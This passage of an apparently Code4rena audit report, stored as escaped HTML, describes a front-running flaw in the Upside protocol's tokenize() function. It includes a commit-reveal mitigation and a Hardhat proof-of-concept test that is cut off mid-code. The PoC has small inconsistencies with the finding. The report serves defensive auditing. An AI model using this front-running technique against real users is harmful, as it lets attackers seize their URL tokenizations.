href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\"\u003eSeverity Categorization\u003c/a\u003e.\u003c/p\u003e\n\u003ch1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"\u003e\u003ca href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eLow Risk and Non-Critical Issues\u003c/h1\u003e\n\u003cp\u003eFor this audit, 27 reports were submitted by wardens detailing low risk and non-critical issues. The \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-609\"\u003ereport highlighted below\u003c/a\u003e by \u003cstrong\u003eBrene\u003c/strong\u003e received the top score from the judge.\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eThe following wardens also submitted reports: \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-238\"\u003e0xcb90f054\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-373\"\u003e0xhp9\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-117\"\u003e0xozovehe\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-594\"\u003eAnyasaa\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-502\"\u003ebefree3x\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-680\"\u003ec0pp3rscr3w3r\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-420\"\u003eCasinoCompiler\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-226\"\u003edobrevaleri\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-396\"\u003edystopia\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-251\"\u003eeLSeR17\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-115\"\u003efarismaulana\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-287\"\u003eharry\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-465\"\u003ehgrano\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-648\"\u003eJamil\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-171\"\u003eK42\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-618\"\u003eMrPotatoMagic\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-243\"\u003epeppef\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-517\"\u003ePolarizedLight\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-434\"\u003erayss\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-423\"\u003eret2basic\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-436\"\u003eRoger\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-454\"\u003eSafetyBytes\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-547\"\u003esakibcy\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-203\"\u003eSakursf\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-353\"\u003eTigerfrake\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-407\"\u003evaminator\u003c/a\u003e.\u003c/em\u003e\u003c/p\u003e\n\u003ch2 id=\"01-front-running-attack-in-tokenize-function\" style=\"position:relative;\"\u003e\u003ca href=\"#01-front-running-attack-in-tokenize-function\" aria-label=\"01 front running attack in tokenize function permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[01] Front-running attack in tokenize function\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L113-L159\"\u003ehttps://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L113-L159\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description\" aria-label=\"finding description permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003etokenize()\u003c/code\u003e function in the \u003ccode\u003eUpsideProtocol\u003c/code\u003e contract allows users to tokenize the provided \u003ccode\u003eurl\u003c/code\u003e. A critical parameter governing this process is \u003ccode\u003etokenizeFeeEnabled\u003c/code\u003e, which determines whether users must pay a fee in order to call the function. When this flag is set to \u003ccode\u003efalse\u003c/code\u003e, users can freely call \u003ccode\u003etokenize()\u003c/code\u003e without paying any fee.\u003c/p\u003e\n\u003cp\u003eThis design introduces a significant front-running risk. Since the function can be called without restriction or cost when fees are disabled, malicious actors can monitor pending transactions in the mempool and submit the same \u003ccode\u003etokenize()\u003c/code\u003e call with a higher gas price to get their transaction mined first.\nOnce the second user successfully tokenizes the provided URL, the contract sets a mapping entry for that URL:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurlToMetaCoinMap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_url\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emetaCoinAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis causes \u003ccode\u003eurlToMetaCoinMap[_ur]\u003c/code\u003e to be non-zero. Therefore, when user1’s transaction is eventually mined, the following check fails:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurlToMetaCoinMap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_url\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eMetaCoinExists\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"impact\" style=\"position:relative;\"\u003e\u003ca href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eAttackers can steal high-value URLs (e.g., popular brand names).\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eRequire users to first commit to a hash of the URL, and then reveal the full URL in a second transaction after a short delay. This prevents front-runners from knowing what is being tokenized in the first transaction.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eIn PoC.test.ts, make the following modification:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"2\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { HardhatEthersSigner } from \u0026quot;@nomicfoundation/hardhat-ethers/signers\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { ethers as hhethers } from \u0026quot;hardhat\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import {IERC20Metadata, UpsideMetaCoin, UpsideProtocol, UpsideStakingStub} from \u0026quot;../types\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    // Add this import\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   import { expect } from \u0026quot;chai\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eAdd the following test in the same file:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"typescript\" data-index=\"3\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Should permit user2 to execute transactions ahead of user1\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurl1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;https://example1.com\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidityTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidityToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenizeFeeDestinationAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Fee configuration\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenizeFeeEnabled:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenizeFeeDestinationAddress:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenizeFeeDestinationAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeStartingBp:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e9900\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,  \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 99%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDecayBp:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,      \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 1%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDecayInterval:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e6\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,  \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 6 seconds\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeFinalBp:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,      \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 1%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDeployerBp:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,  \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 10%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeSellBp:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,       \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 1%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    };\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Set fee info\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eupsideProtocol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Turn off auto-mining to simulate pending transactions in the mempool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enetwork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprovider\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;evm_setAutomine\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, [\u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// User1 submits a transaction with normal gas fees\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1Tx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eupsideProtocol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etokenize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurl1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidityTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egasPrice:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;gwei\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Low priority\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    